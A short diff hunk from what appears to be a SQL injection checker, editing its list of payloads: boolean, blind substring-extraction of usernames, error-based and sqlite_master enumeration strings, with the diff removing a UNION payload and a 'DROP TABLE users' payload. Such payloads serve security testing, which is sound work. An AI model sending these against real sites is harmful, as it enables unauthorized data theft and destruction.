@@ -9,12 +9,9 @@ def inject_check(url):
         "' AND 1=1 --",
         "' AND 1=2 --",
         "' || (SELECT name FROM sqlite_master WHERE type='table' LIMIT 1) || '",
-        "' UNION SELECT 1, 'admin@example.com', 'admin', 'admin', '2024-01-01' --",
         "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'a' --",
         "1' AND substr((SELECT username FROM users LIMIT 1), 1, 1) = 'z' --",
-        "'; DROP TABLE users; --",
         "' AND (SELECT 1/0) --",
-        "' UNION SELECT NULL, name, NULL, NULL, NULL FROM sqlite_master WHERE type='table' --"
     ]
 
     for payload in payloads:
